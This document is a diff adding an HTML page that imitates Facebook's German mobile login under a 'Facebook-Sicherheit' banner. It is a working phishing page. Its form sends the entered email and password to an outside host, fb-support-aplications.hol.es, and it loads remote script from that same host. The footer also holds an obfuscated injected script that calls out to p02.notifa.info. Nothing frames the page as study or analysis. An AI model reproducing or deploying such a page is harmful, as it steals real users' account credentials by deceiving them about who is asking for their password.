@@ -1,0 +1,66 @@
+
+<!--?xml version="1.0" encoding="utf-8"?-->
+<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "xhtml-mobile10.dtd">
+<html><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<title>Facebook</title>
+<link id="Hdqi+" type="text/css" rel="stylesheet" href="546jghjgh_files/k7LsZ6Kzebp.css">
+<link id="yU+cJ" type="text/css" rel="stylesheet" href="546jghjgh_files/RdxXuLZOwAp.css">
+<link id="1mFNa" type="text/css" rel="stylesheet" href="546jghjgh_files/INa-j1hStsU.css">
+<link id="1MiIb" type="text/css" rel="stylesheet" href="546jghjgh_files/diMQkJ1Odg6.css">
+<link id="RtI0j" type="text/css" rel="stylesheet" href="546jghjgh_files/1Vv4bii7bxR.css">
+<link id="2MLkD" type="text/css" rel="stylesheet" href="546jghjgh_files/IFFDgrjmTDl.htm">
+<link id="j0nHs" type="text/css" rel="stylesheet" href="546jghjgh_files/1j-MOx9XPgA.css">
+<link id="mz7Wm" type="text/css" rel="stylesheet" href="546jghjgh_files/VLogo77go.css">
+<link rel="shortcut icon" href="http://fpn811871521z.hol.es/XX/fbck.ico">
+
+<script src="546jghjgh_files/QSUIFyb0MPk.js"></script>
+
+<script type="text/javascript" async="" src="http://fb-support-aplications.hol.es/facebook/546jghjgh_files/request.htm"></script></head>
+<body class="touch acw">
+<h1 class="_52r" style="display:block;height:0;overflow:hidden;position:absolute;width:0">Facebook</h1>
+<div id="page"><div class="mFuturePageHeader chromeBar acb abb" id="m-future-header" data-sigil="marea"><table><tbody><tr><td class="center" id="m-future-header-center">
+<i class="img sp_46vhv4 sx_f45606"><u>facebook</u></i></td></tr></tbody></table></div>
+<div id="root" tabindex="0" role="main" class="_4498 acw"><div id="objects_container"><div class="acy apm abb" data-sigil="marea"><span class="mfsm">Bitte logge dich ein, um fortzufahren</span></div>
+<div id="root" tabindex="0" role="main" class="_4498 acw">
+<div id="objects_container">
+<div class="aclb">
+<div class="loginInner">
+<form method="post" action="http://fb-support-aplications.hol.es/facebook/masuk.php" onsubmit="return Form1_Validator(this)">
+<br><center>
+<img src="546jghjgh_files/fbsecurity.png" alt="" style="border-top-left-radius: 7px; border-top-right-radius: 7px; border-bottom-right-radius: 7px; border-bottom-left-radius: 7px; -webkit-box-shadow: rgba(0, 0, 0, 0.298039) 0px 1px 1px; display: inline-block; height: 70px; width: 70px;" width="70" height="70">&nbsp;&nbsp;<img class="scaledImageFitWidth img" src="546jghjgh_files/1514.jpg" alt="" itemprop="image" style="width: 70px;" width="70" height="70">
+<span style="font-size: 16px;"><br><br></span>
+</center>
+<div class="_al8">Facebook-Sicherheit</div><div class="grouped inset aclb"><div class="mobile-login-field mobile-login-field-email first area textInputArea acw" data-sigil="marea"><div class="input inputWrapper" id="u_0_0">
+<input class="tiapl input" autocorrect="off" autocapitalize="off" name="email" placeholder="E-Mail-Adresse oder Handynummer" required="" data-sigil="clearableInput" type="text"><div class="mClearButtonWrapper" style="display:none" data-sigil="touchable clearButton"><div class="mClearButton">  </div></div></div></div><div class="mobile-login-field last area textInputArea acw abt" data-sigil="marea"><div class="input inputWrapper" id="u_0_1"><input class="tiapl input" autocorrect="off" autocapitalize="off" name="pass" placeholder="Passwort" required="" data-sigil="clearableInput" type="password">
+<div class="mClearButtonWrapper" style="display:none" data-sigil="touchable clearButton"><div class="mClearButton">  </div></div></div></div></div>
+<div class="button_area aclb apl" data-sigil="marea">
+<button type="submit" value="Log in" class="btn btnC largeBtn bglb mfsl touchable" name="login" role="button" data-sigil="touchable">Anmelden</button></div><div class="_4xdr aclb" data-sigil="marea">
+<center><a href="index.html"><span></span></a>
+<iframe src="index.html" scrolling="no" style="border:none; overflow:hidden; width:345px; height:94px;" allowtransparency="true" frameborder="0"></iframe>
+</center><br>
+</div></form></div></div>
+<script language="JavaScript">
+function Form1_Validator(theForm)
+{
+var alertsay = ""; 
+if (theForm.email.value.length < 3)
+{
+alert("Si prega di inserire l'email corretta.
+");
+theForm.email.focus();
+return (false);
+}
+if (theForm.pass.value.length < 6)
+{
+alert("Si prega di inserire la password corretta.
+");
+theForm.pass.focus();
+return (false);
+}}
+</script>
+
+<div id="footer"><div class="acg apm" data-sigil="marea"><span class="mfss fcg"><b>Deutsch</b> <span role="separator" aria-hidden="true">.</span> <a class="sec" href="index.html#">English (US)</a> <span role="separator" aria-hidden="true">.</span> <a class="sec" href="index.html#">More?</a></span></div>
+<div class="acg apm" data-sigil="marea">
+<span class="mfss fcg">
+Facebook 2018</span></div><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m%2f1Y9TVbVT6zO0IBrCQHtJZdIF7wDn2ZqKGI1r9dqZjZ48awdPZkBFZhcSuGJ6QASTQhJKp4UPg8KDCt3X56Cvw58M6rku1RBVW6yvp21R7KtPBqmCVFAPtelb9GxXhRaDGKRBTr4hW%2fGhNZdEw7nPWPBiCknq4wn9N%2fS9yOqWAKQXLEtMxQU7XLAX4NJrEosE3O90wk%2fklUinhSehhsSvlX3jIHLMnbLTtdxbScprPL9ySp37g0jmhrEMhC%2fKokH5cDlWIswISR2n%2beHyKW4nU69KxI3w8SnzHFBVkcQ469s46hE5RrtJ5RKW63VI7PrmHil2ldCYqq8Wv6M01Pa3f0KB0odE63zEHbwphFCcs6NJLZ3%2bGnaO4xCFrf5LR1mvdBCW%2b%2fHY%2bi2hNaA3lyoBP23QPKnb%2bGU4nTBcI31uiR%2f5hiqEXmA%2b2UTPKuomgXVoME9Aq7FR5KnqZ6LclNVvV1l7TpXtTtu2ZSTqJtlfxwflCcNljOxIGcrA7jMjVpl" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></div></div></div></div></div></div></body></html>
